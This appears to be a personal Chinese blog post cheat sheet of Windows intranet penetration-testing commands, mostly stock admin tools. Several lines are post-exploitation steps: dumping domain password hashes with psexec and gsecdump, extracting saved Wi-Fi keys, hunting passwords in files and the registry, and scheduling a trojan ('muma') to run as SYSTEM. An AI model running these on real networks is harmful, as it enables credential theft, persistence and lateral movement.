@@ -1,0 +1,857 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="渗透测试,笔记," />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/images/favicon.ico?v=5.1.0" />
+
+
+
+
+
+
+<meta name="description" content="0x00 前言对内网渗透这里很多知识技巧不了解，所以认真看了几天，顺便总结下windows内网渗透的常用命令。 0x01 查看域信息123456789101112131415161718192021222324252627282930313233net group /domain                        //获得所有域用户组列表 net group qq_group /dom">
+<meta name="keywords" content="渗透测试,笔记">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内网渗透常用命令总结（windows）">
+<meta property="og:url" content="http://yoursite.com/2018/05/05/内网渗透常用命令总结（windows）/index.html">
+<meta property="og:site_name" content="Leticia&#39;s Blog">
+<meta property="og:description" content="0x00 前言对内网渗透这里很多知识技巧不了解，所以认真看了几天，顺便总结下windows内网渗透的常用命令。 0x01 查看域信息123456789101112131415161718192021222324252627282930313233net group /domain                        //获得所有域用户组列表 net group qq_group /dom">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2018-05-05T13:56:03.085Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="内网渗透常用命令总结（windows）">
+<meta name="twitter:description" content="0x00 前言对内网渗透这里很多知识技巧不了解，所以认真看了几天，顺便总结下windows内网渗透的常用命令。 0x01 查看域信息123456789101112131415161718192021222324252627282930313233net group /domain                        //获得所有域用户组列表 net group qq_group /dom">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    sidebar: {"position":"left","display":"post","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/05/05/内网渗透常用命令总结（windows）/"/>
+
+
+
+
+
+  <title> 内网渗透常用命令总结（windows） | Leticia's Blog </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Leticia's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">She will never see the day it blossoms,maybe.</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/05/05/内网渗透常用命令总结（windows）/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="麻薯">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Leticia's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                内网渗透常用命令总结（windows）
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-05-05T21:55:03+08:00">
+                2018-05-05
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/笔记/" itemprop="url" rel="index">
+                    <span itemprop="name">笔记</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2018/05/05/内网渗透常用命令总结（windows）/" class="leancloud_visitors" data-flag-title="内网渗透常用命令总结（windows）">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>对内网渗透这里很多知识技巧不了解，所以认真看了几天，顺便总结下windows内网渗透的常用命令。</p>
+<h2 id="0x01-查看域信息"><a href="#0x01-查看域信息" class="headerlink" title="0x01 查看域信息"></a>0x01 查看域信息</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">net group /domain                        //获得所有域用户组列表 </span><br><span class="line">net group qq_group /domain               //显示域中qq_group组的成员 </span><br><span class="line">net group qq_group /del /domain          //删除域中qq_group组</span><br><span class="line">net group qq_group qq /del /domain       //删除域内qq_group 群组中的成员QQ</span><br><span class="line">net group qq_group /add /domain          //增加域中的群组</span><br><span class="line">net group &quot;domain admins&quot;  /domain       //获得域管理员列表</span><br><span class="line">net group &quot;enterprise admins&quot; /domain    //获得企业管理员列表</span><br><span class="line">net localgroup administrators /domain    //获取域内置administrators组用（enterprise admins、domain admins）</span><br><span class="line">net group &quot;domain controllers&quot;  /domain   //获得域控制器列表</span><br><span class="line">net group &quot;domain computers&quot;  /domain    //获得所有域成员计算机列表</span><br><span class="line">net user /domain                        //获得所有域用户列表</span><br><span class="line">net user someuser /domain              //获得指定账户someuser的详细信息</span><br><span class="line">net accounts /domain                //获得域密码策略设置，密码长短，错误锁定等信息</span><br><span class="line">nei view /domain                   //查询有几个域, 查询域列表</span><br><span class="line">net view /domain:testdomain       //查看 testdomain域中的计算机列表</span><br><span class="line">nltest /domain_trusts              //获取域信任信息</span><br><span class="line">net user domain-admin /domain      //查看管理员登陆时间，密码过期时间，是否有登陆脚本，组分配等信息</span><br><span class="line">net config Workstation         //查询机器属于哪个域</span><br><span class="line">net time /domian               //查询主域服务器的时间</span><br><span class="line">echo %logonserver%              //查看登陆到这台服务器的计算机名</span><br><span class="line">net time  \\192.168.1.1         //查询远程共享主机192.168.1.1的时间</span><br><span class="line">net use \\IP\ipc$ password /user:username@domain     //ipc$域内连接</span><br><span class="line">net  view  \\dc2.backlion.com         //查看域控共享情况</span><br><span class="line">dir \\dc2.backlion.com\SYSVOL /s /a &gt; sysvol.txt  //列出sysvol日志记录</span><br><span class="line">xcopy \\dc2.backlion.com\sysvol.txt  sysvol.txt  /i  /e  /c //远程拷贝到本地sysvol日志</span><br><span class="line">net user  /domain  bk  bk123                 //修改域内用户密码，需要管理员权限</span><br><span class="line">net  localgroup  administartors   SEZKL\backlion  /add      //将SEZKL域中的用户backlion添加到administrators组中</span><br><span class="line">mstsc /admin                 //远程桌面登录到console会话解决hash无法抓出问题</span><br><span class="line">gpupdate/force                  //更新域策略</span><br><span class="line">psexec  \\192.168.1.3  -u  administrator  -p  bk1234  -c  gsecdump.exe  -u</span><br><span class="line">  //从域服务器密码存储文件windows/ntds/ntds.dit导出hash值出来</span><br><span class="line">gsecdump  -a        //获取域登管理员登录过得hash值，这里gescdump为第三方导出AD域的hash值</span><br><span class="line">tasklist /S ip /U domain\username /P /V     //查看远程计算机进程列</span><br></pre></td></tr></table></figure>
+<h2 id="0x02-基本命令"><a href="#0x02-基本命令" class="headerlink" title="0x02 基本命令"></a>0x02 基本命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">ipconfig/all    //查看IP地址</span><br><span class="line">ipconfig /release  //释放地址</span><br><span class="line">ipconfig /renew 重新获取Ip地址</span><br><span class="line">whoami    //查询账号所属权限</span><br><span class="line">whoami/all  //查看sid值</span><br><span class="line">systeminfo  //查询系统以及补丁信息</span><br><span class="line">tasklist /svc   //查看进程</span><br><span class="line">taskkill /im 进程名称(cmd)  //结束进程</span><br><span class="line">taskkill /pid[进程码] -t(结束该进程) -f(强制结束该进程以及所有子进程)</span><br><span class="line">wmic qfe  get hotfixid    //查看已安装过得补丁，这个很实用</span><br><span class="line">wmic qfe list full /format:htable &gt; hotfixes.htm  //详细的补丁安装</span><br><span class="line">wmic  qfe      //查询补丁信息以及微软提供的下载地址</span><br><span class="line">ping hostname(主机名）   //显示该机器名的IP </span><br><span class="line">net start   //查看当前运行的服务</span><br><span class="line">net user      //查看本地组的用户</span><br><span class="line">net localhroup administrators   //查看本机管理员组有哪些用户</span><br><span class="line">net use      //查看会话</span><br><span class="line">net session     //查看当前会话</span><br><span class="line">net share       //查看SMB指向的路径[即共享]</span><br><span class="line">wmic share get name,path   //查看SMB指向的路径</span><br><span class="line">wmic nteventlog get path,filename,writeable //查询系统日志文件存储位置</span><br><span class="line">net use \\IP\ipc$  password  /user:username      //建立IPC会话（工作组模式）</span><br><span class="line">net use  z:  \\192.168.1.1      //建立映射到本机Z盘</span><br><span class="line">net time \\172.16.16.2        //查询共享主机的是</span><br><span class="line">at \\172.16.16.2 13:50 c:\windows\2009.exe      //在共享主机上执行</span><br><span class="line">netstat  -ano      //查看开放的端口</span><br><span class="line">netstat -an | find “3389”   //找到3389端口</span><br><span class="line">net accounts      //查看本地密码策略</span><br><span class="line">nbtstat –A ip      //netbiso查询</span><br><span class="line">net view      //查看机器注释或许能得到当前活动状态的机器列表，如果禁用netbios就查看不出来</span><br><span class="line">echo %PROCESSOR_ARCHITECTURE%         //查看系统是32还是64位  </span><br><span class="line">set                              //查看系统环境设置变量</span><br><span class="line">net start                     //查看当前运行的服务</span><br><span class="line">wmic service list brief              //查看进程服务</span><br><span class="line">wmic process list brief         //查看进程</span><br><span class="line">wmic startup list brief       //查看启动程序信息</span><br><span class="line">wmic product list brief            //查看安装程序和版本信息（漏洞利用线索）</span><br><span class="line">wmic startup list full         //识别开机启动的程序</span><br><span class="line">wmic process where(description=&quot;mysqld.exe&quot;) &gt;&gt; mysql.log  //获取软件安装路径</span><br><span class="line"></span><br><span class="line">for /f &quot;skip=9 tokens=1,2 delims=:&quot; %i in (&apos;netsh wlan show profiles&apos;) do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear</span><br><span class="line"> //一键获取wifi密码</span><br><span class="line"></span><br><span class="line"> if defined PSModulePath (echo 支持powershell) else (echo 不支持powershell) </span><br><span class="line">//查看是否支持posershell</span><br><span class="line"></span><br><span class="line">qwinsta                       //查看登录情况</span><br><span class="line"></span><br><span class="line">schtasks.exe  /Create /RU &quot;SYSTEM&quot; /SC MINUTE /MO 45 /TN FIREWALL /TR &quot;c:/muma.ex    e&quot; /ED 2017/4/7  //添加计划任务</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">set KB2829361=MS13-046&amp;set KB2830290=MS13-046&amp;set KB2667440=MS12-020&amp;set KB2667402=MS12-020&amp;set KB3124280=MS16-016&amp;set KB3077657=MS15-077&amp;set KB3045171=MS15-051&amp;set KB2592799=MS11-080&amp;set KB952004=MS09-012 PR&amp;set KB956572=MS09-012 巴西烤肉&amp;set KB970483=MS09-020 iis6&amp;set KB2124261=MS10-065 ii7&amp;set KB2271195=MS10-065 ii7&amp;systeminfo&gt;a.txt&amp;(for %i in (KB952004 KB956572 KB2393802 KB2503665 KB2592799 KB2621440 KB2160329 KB970483 KB2124261 KB977165 KB958644 KB2667402 KB2667440 KB2830290 KB2829361 KB3045171 KB3077657 KB3124280) do @type a.txt|@find /i &quot;%i&quot;||@echo %%i% Not Installed!)&amp;del /f /q /a a.txt</span><br><span class="line"> //windows未打补丁情况</span><br><span class="line"></span><br><span class="line"> REG query HKCU  /v &quot;pwd&quot; /s  //获取保存到注册表中的密码</span><br></pre></td></tr></table></figure>
+<h2 id="0x03-内网网络结构"><a href="#0x03-内网网络结构" class="headerlink" title=" 0x03 内网网络结构"></a> 0x03 内网网络结构</h2> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> tracert IP    //路由跟踪</span><br><span class="line">route print    //打印路由表</span><br><span class="line">arp -a          //列出本网段内所有活跃的IP地址</span><br><span class="line">arp -s （ip + mac）//绑定mac与ip地址</span><br><span class="line">arp -d （ip + mac） //解绑mac与ip地址</span><br><span class="line">nbtscan -r 192.168.16.0/24      //通过小工具nbtscan扫描整个网络</span><br><span class="line">netsh firewall show config     //查看防火墙策略</span><br><span class="line">netsh firewall show state     //查看防火墙策略</span><br><span class="line">for /l %i in (1,1,255) do @ping 10.0.0.%i -w 1 -n 1 | find /i &quot;ttl&quot;   //批量扫描内网存活主机</span><br><span class="line"></span><br><span class="line">windows自带端口转发：</span><br><span class="line">netsh interface ipv6 install  //首先安装IPV6（xp、2003下IPV6必须安装，否则端口转发不可用！）</span><br><span class="line">netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=22 connectaddress=1.1.1.1 connectport=22  //将本机22到1.1.1.1的22</span><br><span class="line">netsh interface portproxy add v4tov4 listenaddress=192.168.193.1 listenport=22 connectaddress=8.8.8.8 connectport=22</span><br><span class="line">netsh interface portproxy add v4tov4 listenaddress=192.168.193.1 listenport=22 connectaddress=www.baidu.com connectport=22</span><br><span class="line">netsh interface portproxy show all // 查看转发配置</span><br><span class="line">netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=22 //删除配置</span><br><span class="line">netsh firewall set portopening protocol=tcp port=22 name=Forward mode=enable scope=all profile=all  //添加防火墙规则，允许连接22：</span><br></pre></td></tr></table></figure>
+<p>0x04 敏感数据<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">dir /b/s config.*              //查看所在目录所有config.为前缀的文件</span><br><span class="line">findstr /si password *.xml *.ini *.txt     //查看后缀名文件中含有password关键字的文件</span><br><span class="line">findstr /si login *.xml *.ini *.txt     //查看后缀名文件中含有login关键字的文件</span><br><span class="line">copy con 创建命令：</span><br><span class="line">copy con  ftp.bat     //创建ftp.bat批处理，然后输入ifconfig等命令，按ctr+z退出，并创建成功</span><br><span class="line">copy con  test.vbs    //创建test.vbs脚本，输入脚本后，按ctr+z退出，并创建成功</span><br></pre></td></tr></table></figure></p>
+<h2 id="0x05-常用快捷命令"><a href="#0x05-常用快捷命令" class="headerlink" title="0x05 常用快捷命令"></a>0x05 常用快捷命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">mspaint　　画图工具</span><br><span class="line">calc　　计算机</span><br><span class="line">notepad　　记事本</span><br><span class="line">taskmgr　　任务管理器</span><br><span class="line">osk　　打开屏幕键盘</span><br><span class="line">gpedit.msc　　组策略</span><br><span class="line">services.msc　　本地服务</span><br><span class="line">compmgmt.msc　　计算机管理</span><br><span class="line">devmgmt.msc　　设备管理器</span><br><span class="line">winver　　查看系统版本</span><br><span class="line">magnify　　放大镜实用程序</span><br><span class="line">eventvwr　　事件查看器</span><br><span class="line">Regedit　　打开注册表</span><br><span class="line">resmon　　资源监视器</span><br><span class="line">WMIC BIOS get releasedate　　查看电脑生产日期</span><br><span class="line">mstsc -f　　远程连接（可以全屏）</span><br></pre></td></tr></table></figure>
+<h2 id="0x06-其他"><a href="#0x06-其他" class="headerlink" title="0x06 其他"></a>0x06 其他</h2><p>其他更多命令和详细的用法说明，可以参考官方文档</p>
+<p><a href="https://download.microsoft.com/download/5/8/9/58911986-D4AD-4695-BF63-F734CD4DF8F2/ws-commands.pdf" target="_blank" rel="noopener">https://download.microsoft.com/download/5/8/9/58911986-D4AD-4695-BF63-F734CD4DF8F2/ws-commands.pdf</a></p>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/渗透测试/" rel="tag"># 渗透测试</a>
+          
+            <a href="/tags/笔记/" rel="tag"># 笔记</a>
+          
+        </div>
+      
+
+      
+        
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/05/03/浅谈XXE漏洞/" rel="next" title="浅谈XXE漏洞">
+                <i class="fa fa-chevron-left"></i> 浅谈XXE漏洞
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/uploads/avatar.jpg"
+               alt="麻薯" />
+          <p class="site-author-name" itemprop="name">麻薯</p>
+           
+              <p class="site-description motion-element" itemprop="description"></p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives">
+                <span class="site-state-item-count">47</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">13</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">43</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+        
+        
+
+        
+        
+
+        
+
+		
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-前言"><span class="nav-number">1.</span> <span class="nav-text">0x00 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-查看域信息"><span class="nav-number">2.</span> <span class="nav-text">0x01 查看域信息</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-基本命令"><span class="nav-number">3.</span> <span class="nav-text">0x02 基本命令</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-内网网络结构"><span class="nav-number">4.</span> <span class="nav-text"> 0x03 内网网络结构</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-常用快捷命令"><span class="nav-number">5.</span> <span class="nav-text">0x05 常用快捷命令</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-其他"><span class="nav-number">6.</span> <span class="nav-text">0x06 其他</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">麻薯</span>
+</div>
+
+
+<div class="powered-by">
+  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Muse
+  </a>
+</div>
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.0"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.0"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.1.js"></script>
+  <script>AV.initialize("GWhcWVw7VpoLTRfaQ2D1q3fj-gzGzoHsz", "4eb8jdrkQzBrcf7sJImJdOPd");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
